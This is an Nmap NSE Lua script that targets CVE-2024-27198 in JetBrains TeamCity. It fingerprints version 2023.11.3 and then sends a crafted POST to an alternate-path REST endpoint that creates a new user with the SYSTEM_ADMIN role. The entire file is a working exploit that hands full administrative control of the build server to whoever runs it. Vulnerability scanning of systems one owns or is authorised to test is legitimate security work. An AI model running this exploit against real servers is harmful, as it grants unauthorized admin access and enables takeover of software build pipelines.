local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local json = require "json"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

-- @see http-vuln-cve2024-27198.nse
-- nmap -sS -p80 -sV --script=http-vuln-cve2024-27198.nse --script-args "name=username,password=password,email=contact@email.com" <targets>
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-vuln-cve2021-4433-dos:
-- |    VULNERABLE:
-- |   Authentication Bypass Using an Alternate Path vulnerability in JetBrains TeamCity Server
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:2024-27198
-- |     Risk factor: HIGH  CVSSv3: 9.8 (CRITICAL) (/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-- |       TeamCity is a platform developed by JetBrains. There is a vulnerability that exploits the
-- |       absence of user authentication, allowing the creation of a user account.
-- |       This script exploits the vulnerability of the endpoint and creates a user account in TeamCity
-- |
-- |     Disclosure date: 2024-03-04
-- |     References:
-- |       https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199-update-to-2023-11-4-now/
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-27198
-- |_      https://nvd.nist.gov/vuln/detail/CVE-2024-27198

description = [[
The script checks for and exploits a vulnerability in the user endpoint and creates a user in the TeamCity system.
]]

author = "Fernando Mengali <fernando.mengalli()gmail.com>"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}

portrule = shortport.http

action = function(host, port)

local name = stdnse.get_script_args("name") or "username"
local email = stdnse.get_script_args("email") or "username@email.com"
local password = stdnse.get_script_args("password") or "1234567890"

local vuln = {
       title = 'Authentication Bypass Using an Alternate Path vulnerability in JetBrains TeamCity Server',
       state = vulns.STATE.NOT_VULN, -- default
       IDS = {CVE = '2024-27198'},
       risk_factor = "HIGH",
       scores = {
      CVSSv3 = "9.8 (CRITICAL) (/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
    },
       description = [[
TeamCity is a platform developed by JetBrains. There is a vulnerability that exploits the 
absence of user authentication, allowing the creation of a user account. 
This script exploits the vulnerability of the endpoint and creates a user account in TeamCity
]],
       references = {
          'https://nvd.nist.gov/vuln/detail/CVE-2024-27198',
           'https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199-update-to-2023-11-4-now/',
       },
       dates = {
           disclosure = {year = '2024', month = '03', day = '04'},
       },
     }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local status = false
  local resultado

  local res = http.get(host, "8111","/login.html")
  local conteudo = res.body
  
  if conteudo:match(" 2023.11.3") and conteudo:match("build 147512") then

  local jin = {userData=name,username = name,password = password,email = email,roles={role={{roleId = "SYSTEM_ADMIN", scope = "g"}}}}
  json.make_object(jin)

  resultado = http.post(host, "8111","/p?jsp=/app/rest/users;.jsp", {header = {["Content-Type"] = "application/json"}},nil,json.generate(jin))

  local body = resultado.body

  if resultado.status == 400 then
      return "[-] - TeamCity not Exploited!"
  elseif body:match("username") then
  
      vuln.state = vulns.STATE.EXPLOIT
      return vuln_report:make_output(vuln)
  else 
      return "[*] - Not possible Exploited"
  end
else 
  return "[-] This application is not TeamCity"
end 
end
